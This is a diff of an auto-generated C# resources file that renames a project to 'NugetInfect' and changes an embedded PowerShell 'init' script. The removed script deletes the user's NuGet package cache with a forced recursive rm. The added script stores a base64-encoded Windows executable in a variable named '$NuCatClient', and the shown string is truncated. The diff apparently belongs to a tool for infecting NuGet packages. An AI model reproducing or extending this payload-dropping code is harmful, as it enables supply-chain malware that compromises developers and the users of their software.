@@ -8,7 +8,7 @@
 // </auto-generated>
 //------------------------------------------------------------------------------
 
-namespace DarkControls.Properties {
+namespace NugetInfect.Properties {
     using System;
     
     
@@ -39,7 +39,7 @@ namespace DarkControls.Properties {
         public static global::System.Resources.ResourceManager ResourceManager {
             get {
                 if (object.ReferenceEquals(resourceMan, null)) {
-                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("DarkControls.Properties.Resources", typeof(Resources).Assembly);
+                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("NugetInfect.Properties.Resources", typeof(Resources).Assembly);
                     resourceMan = temp;
                 }
                 return resourceMan;
@@ -231,10 +231,7 @@ namespace DarkControls.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to rm &quot;$env:USERPROFILE\.nuget\packages&quot; -r -force
-        ///Add-Type -AssemblyName PresentationFramework
-        ///[System.Windows.MessageBox]::Show(&apos;Hello World&apos;)
-        ///Write-Output &apos;Hello From ps!&apos;.
+        ///   Looks up a localized string similar to $NuCatClient = &apos;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAJMavJUAAAAAAAAAAOAAIgALATAAAHh9AQAIAAAAAAAAkpd9AQAgAAAAoH0BAABAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAADgfQEAAgAAAAAAAAIAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAD6XfQFPAAAAAKB9AbQFAAAAAAAAAAAAAAAAAAAAAAAAAMB9AQwAAACkln0BOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAA [rest of string was truncated]&quot;;.
         /// </summary>
         public static string init {
             get {
